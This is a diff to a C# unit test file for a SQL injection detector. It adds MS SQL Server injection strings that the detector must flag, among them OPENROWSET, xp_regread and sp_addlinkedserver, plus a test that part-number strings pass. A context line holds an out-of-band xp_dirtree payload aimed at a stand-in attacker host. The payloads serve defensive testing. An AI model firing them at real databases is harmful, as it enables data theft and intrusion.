@@ -593,12 +593,53 @@ public sealed class SqlInjectDetectorTests
 
             // Out-of-band attacks
             "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'; --",
+            
+            // OPENROWSET for unauthorized data access
+            "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=server;UID=user;PWD=pass', 'SELECT * FROM users')",
+            
+            // OPENQUERY for linked server attacks
+            "SELECT * FROM OPENQUERY(LINKED_SERVER, 'SELECT * FROM users')",
+            
+            // DBCC commands
+            "' OR 1=1; DBCC CHECKDB; --",
+            
+            // xp_regread for reading registry
+            "'; EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'; --",
+            
+            // sp_addlinkedserver to create a linked server
+            "'; EXEC sp_addlinkedserver 'new_server', 'SQL Server'; --",
         };
 
         // Act & Assert
         foreach (var input in msSqlInjections)
         {
             Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(input), $"MS SQL Server specific injection '{input}' should be detected");
+        }
+    }
+
+    [TestMethod]
+    public void ContainsSqlInjection_ValidPartDataWithSpecialChars_ReturnsFalse()
+    {
+        // Arrange - Part data with special characters that should be considered valid.
+        var validPartData = new[]
+        {
+            "PN-555.123.456",
+            "SKU.123-ABC.789",
+            "PART-NO: 123.456-789/A",
+            "ID_123-456.v2",
+            "REF: 987-654.321.B",
+            "Engine Control Module (ECM) - P/N 12345.67890",
+            "Sensor, Oxygen - Bosch 15717.02",
+            "Brake Rotor, Drilled/Slotted - 320.4001.12",
+            "Filter-Set: Oil, Air, Cabin - MANN-FILTER CUK 2939-2",
+            "Assembly-123.45.6-rev.2"
+        };
+
+        // Act & Assert
+        foreach (var partData in validPartData)
+        {
+            Assert.IsFalse(SqlInjectDetector.ContainsSqlInjection(partData), 
+                $"Valid part data '{partData}' should not be flagged as injection");
         }
     }
 }
